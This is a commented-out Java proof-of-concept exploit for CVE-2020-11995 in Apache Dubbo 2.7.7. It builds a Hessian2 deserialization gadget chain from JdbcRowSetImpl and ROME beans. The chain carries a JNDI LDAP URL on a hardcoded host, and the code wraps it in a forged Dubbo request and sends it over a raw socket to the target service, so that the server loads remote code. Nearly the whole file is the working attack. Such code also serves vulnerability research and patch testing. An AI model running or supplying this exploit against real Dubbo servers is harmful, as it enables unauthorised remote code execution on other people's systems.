//package dubbo.cve;
//
//import com.rometools.rome.feed.impl.EqualsBean;
//import com.rometools.rome.feed.impl.ToStringBean;
//import com.sun.rowset.JdbcRowSetImpl;
//import org.apache.dubbo.common.io.Bytes;
//import org.apache.dubbo.common.serialize.Cleanable;
//import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
//import ysoserial.payloads.util.Gadgets;
//import ysoserial.payloads.util.Reflections;
//
//import java.io.ByteArrayOutputStream;
//import java.io.OutputStream;
//import java.net.Socket;
//import java.util.HashMap;
//import java.util.Random;
//
///**
// * 测试版本：dubbo 2.7.7
// * 修复版本：dubbo 2.7.8
// */
//public class CVE_2020_11995 {
//
//    static String dubbo_ip = "10.58.120.200";
//    static int dubbo_port = 20880;
//    static String ldapUri = "ldap://10.58.120.200:1389/smsrav";
//
//    public static void setPayload(Hessian2ObjectOutput body, String jndiUrl) throws Exception {
//
//        JdbcRowSetImpl rs = new JdbcRowSetImpl();
//        rs.setDataSourceName(jndiUrl);
//        rs.setMatchColumn("foo");
//        Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);
//
//        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
//        EqualsBean root = new EqualsBean(ToStringBean.class, item);
//
//        HashMap hashMap = Gadgets.makeMap(root, root);
//
//        body.writeObject(hashMap);
//    }
//
//    public static void main(String[] args) throws Exception{
//
//        // header.
//        byte[] dubbo_header = new byte[16];
//        // set magic number.
//        Bytes.short2bytes((short) 0xdabb, dubbo_header);
//        // set request and serialization flag.
//        dubbo_header[2] = (byte) ((byte) 0x80 | 2);
//        // set request id.
//        Bytes.long2bytes(new Random().nextInt(100000000), dubbo_header, 4);
//
//        //bodyBaos
//        ByteArrayOutputStream bodyBaos = new ByteArrayOutputStream();
//        Hessian2ObjectOutput body = new Hessian2ObjectOutput(bodyBaos);
//
//        body.writeUTF("2.7.1");
//        body.writeUTF("any_path");
//        body.writeUTF("");
//        body.writeUTF("$invokeAsync");//$invoke $invokeAsync $echo  方法名换成三个中任意一个
//        body.writeUTF("Ljava/util/Map;");
//        setPayload(body,ldapUri);
//        body.writeObject(new HashMap());
//
//        body.flushBuffer();
//        if (body instanceof Cleanable) {
//            ((Cleanable) body).cleanup();
//        }
//
//        Bytes.int2bytes(bodyBaos.size(), dubbo_header, 12);
//        //totalBaos
//        ByteArrayOutputStream totalBaos = new ByteArrayOutputStream();
//
//        totalBaos.write(dubbo_header);
//        totalBaos.write(bodyBaos.toByteArray());
//
//        byte[] bytes = totalBaos.toByteArray();
//
//        Socket socket = new Socket(dubbo_ip, dubbo_port);
//        OutputStream outputStream = socket.getOutputStream();
//        outputStream.write(bytes);
//        outputStream.flush();
//        outputStream.close();
//    }
//}